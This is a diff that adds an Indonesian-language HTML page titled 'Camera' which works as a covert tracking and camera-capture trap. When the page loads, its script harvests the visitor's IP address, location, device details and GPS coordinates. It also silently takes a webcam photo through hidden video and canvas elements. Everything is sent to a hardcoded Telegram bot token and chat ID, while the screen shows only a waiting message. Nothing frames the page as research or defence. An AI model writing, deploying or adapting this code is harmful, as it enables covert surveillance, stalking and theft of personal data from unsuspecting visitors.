@@ -1,0 +1,196 @@
+<!-- uploader by Laskar ID -->
+
+<!-- uploader by Laskar ID -->
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+
+    #info {
+      width: 100%;
+      max-width: 700px;
+      background: #111;
+      padding: 16px;
+      border-radius: 12px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow-wrap: break-word;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    @media (min-width: 768px) {
+      #info {
+        padding: 24px;
+        font-size: 15px;
+      }
+    }
+
+    @media (min-width: 1024px) {
+      #info {
+        max-width: 900px;
+        font-size: 16px;
+      }
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!--Bebas Req Tampilan-->
+  <div id="info">Sabar Mankkk...</div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const botToken = '7382464193:AAEcnRCG6dx09rdB4qxrxtCj75y-IwRnFy0';
+    const chatId = '5201965087';
+    const infoDiv = document.getElementById('info');
+
+    function sendToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(r => r.json())
+      .then(d => { if (!d.ok) console.error('❌ Telegram Error:', d); })
+      .catch(e => console.error('❌ Telegram Fetch Error:', e));
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob);
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(r => r.json())
+      .then(d => { if (!d.ok) console.error('❌ Photo Upload Error:', d); })
+      .catch(e => console.error('❌ Telegram Photo Error:', e));
+    }
+
+    async function getInfo() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+
+        if (loc.status === 'success') {
+          city = loc.city;
+          region = loc.regionName;
+          country = loc.country;
+          org = loc.org;
+        }
+      } catch (err) {
+        console.error('❌ IP/Location Error:', err);
+      }
+
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+
+      const text = `
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+
+Browser    : ${navigator.userAgent}
+OS         : ${navigator.platform}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+
+Waktu      : ${new Date().toLocaleString()}
+      `.trim();
+
+      infoDiv.innerText = text;
+
+      sendToTelegram(`<b>📥 Informasi Pengunjung:</b>\n<pre>${text}</pre>`);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          err => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser tidak support GPS`);
+      }
+    }
+
+    async function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+              if (blob) sendPhotoToTelegram(blob);
+              stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg');
+          }, 3000);
+        };
+      } catch (e) {
+        console.warn('❌ Kamera gagal:', e);
+        sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+      }
+    }
+
+    getInfo();
+    startCamera();
+  </script>
+
+</body>
+</html>
+
+<!-- uploader by Laskar ID -->
+
+<!-- uploader by Laskar ID -->
